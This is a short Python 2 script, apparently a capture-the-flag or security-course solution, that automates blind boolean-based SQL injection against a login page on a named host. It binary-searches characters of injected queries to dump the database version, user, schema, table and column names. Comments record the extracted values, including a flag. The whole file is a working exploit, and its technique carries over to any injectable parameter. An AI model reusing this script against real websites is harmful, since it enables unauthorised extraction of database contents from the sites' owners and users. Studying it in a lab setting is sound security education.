import requests

def bool_sqli(payload, query, true_msg):
    i = 1
    bound_up = 128
    bound_down = 0
    result = ""
    while 1:
        for j in range(0,8):
            bound_mid = (bound_up + bound_down) / 2
            bool_query = "(ASCII(SUBSTRING((" + query + ")," + str(i) + ",1)) > " + str(bound_mid) + ")"
            url = payload.replace("$INPUT", bool_query)
            #print url
            r = requests.get(url)
            #print r.content
            if (true_msg in str(r.content)):
                bound_down = bound_mid
            else:
                bound_up = bound_mid
        result = result + chr(bound_up)
        if bound_up == 0:
            break
        print result
        i = i + 1
        bound_up = 128
        bound_down = 0
    print query + " = " + result
    return result

def bool_sqli_list(payload, true_msg):
    # version = 5.5.38-0ubuntu0.14.04.1
    query = "@@version"
    result = bool_sqli(payload, query, true_msg)
    # current user() = sqli_boolean@localhost
    query = "user()"
    result = bool_sqli(payload, query, true_msg)
    # current database() = sqli_boolean
    query = "database()"
    result = bool_sqli(payload, query, true_msg)
    # list database = information_schema, sqli_boolean
    query = "SELECT schema_name FROM information_schema.schemata limit 0,1"
    query = "SELECT schema_name FROM information_schema.schemata limit 1,1"
    result = bool_sqli(payload, query, true_msg)
    # list table_schema = sqli_boolean
    query = "SELECT table_schema FROM information_schema.tables "
    query += "WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"
    result = bool_sqli(payload, query, true_msg)
    # list table_name = iamflag
    query = "SELECT table_name FROM information_schema.tables "
    query += "WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 0,1"
    result = bool_sqli(payload, query, true_msg)
    # list columes = id, flag
    query = "SELECT column_name FROM information_schema.columns "
    query += "WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 1,1"
    result = bool_sqli(payload, query, true_msg)
    # SecProg{HelloMyFirstBooleanSQLINJECTION}    
    query = "SELECT flag FROM iamflag limit 0,1"
    result = bool_sqli(payload, query, true_msg)

if __name__ == "__main__":
    payload = "http://tor.atdog.tw:8080/boolean/login.php?u=admin&p=admin' and $INPUT or '"
    true_msg = "Login Success"
    bool_sqli_list(payload, true_msg)

